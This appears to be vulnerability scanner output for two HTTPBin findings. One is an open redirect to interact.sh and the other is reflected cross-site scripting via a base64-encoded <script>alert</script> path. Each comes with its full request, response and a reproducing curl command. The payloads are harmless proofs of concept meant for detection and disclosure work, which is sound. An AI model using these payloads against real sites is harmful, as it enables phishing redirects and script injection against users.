info.name: HTTPBin - Open Redirect
author: adam crosser
info.description: HTTPBin contains an open redirect vulnerability. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.

request:
GET /redirect-to?url=https%3A%2F%2Finteract.sh HTTP/1.1
Host: httpbin.org
User-Agent: Mozilla/5.0 (Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
response:
HTTP/1.1 302 FOUND
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: *
Connection: keep-alive
Content-Type: text/html; charset=utf-8
Date: Wed, 16 Sep 2026 05:37:51 GMT
Location: https://interact.sh
Server: gunicorn/19.9.0
Content-Length: 0
curl-command: curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36' 'https://httpbin.org/redirect-to?url=https%3A%2F%2Finteract.sh'

info.name: HTTPBin - Cross-Site Scripting
author: adam crosser
info.description: HTTPBin contains a cross-site scripting vulnerability which can allow an attacker to execute arbitrary script. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

request:
GET /base64/PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+ HTTP/1.1
Host: httpbin.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
response:
HTTP/1.1 200 OK
Content-Length: 39
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: *
Connection: keep-alive
Content-Type: text/html; charset=utf-8
Date: Wed, 16 Sep 2026 05:37:56 GMT
Server: gunicorn/19.9.0

<script>alert(document.domain)</script>
curl-command: curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36' 'https://httpbin.org/base64/PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+'
